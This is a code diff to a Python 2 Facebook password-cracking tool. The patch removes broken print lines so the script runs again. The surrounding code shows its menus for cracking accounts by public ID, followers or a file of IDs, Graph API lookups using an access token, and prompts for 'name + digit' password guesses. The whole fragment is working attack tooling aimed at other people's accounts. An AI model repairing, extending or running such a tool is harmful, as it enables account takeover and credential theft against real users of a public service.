@@ -447,7 +447,6 @@ def crack():
     os.system('clear')
     print logo
     print "\033[1;97m~~~~ Auto pass cracking ~~~~"
-    print "
     print "\033[1;92m[1] Public id cloning"
     print "\033[1;92m[2] Followers cloning"
     print "\033[1;92m[3] File cloning"
@@ -470,7 +469,6 @@ def auto_crack():
     os.system('clear')
     print logo
     print "\033[1;93m~~~~ Auto pass cracking ~~~~"
-    print "
     print "\033[1;93m[1] Public id cloning"
     print "\033[1;93m[2] Followers cloning"
     print "\033[1;93m[3] File cloning"
@@ -487,7 +485,6 @@ def a_s():
         os.system('clear')
         print logo
         print "\033[1;93m~~~~ Auto pass public cracking ~~~~"
-        print "
         idt = raw_input("\n\033[1;31;40m>>>Enter id\033[1;35;40m")
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -514,9 +511,7 @@ def a_s():
         os.system('clear')
         print logo
         print "\033[1;93m~~~~ Name pass followers cracking ~~~~"
-        print "
         print "\033[1;96mFor example:123,1234,12345,786,12,1122"
-        print "
         p1 = raw_input(' \033[1;92m[1]Name + digit: ')
         p2 = raw_input(' \033[1;92m[2]Name + digit: ')
         p3 = raw_input(' \033[1;92m[3]Name + digit: ')
@@ -547,7 +542,6 @@ def a_s():
         os.system('clear')
         print logo
         print '\033[1;93m~~~~ Auto pass File cracking ~~~~\x1b[1;91m'
-        print "
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
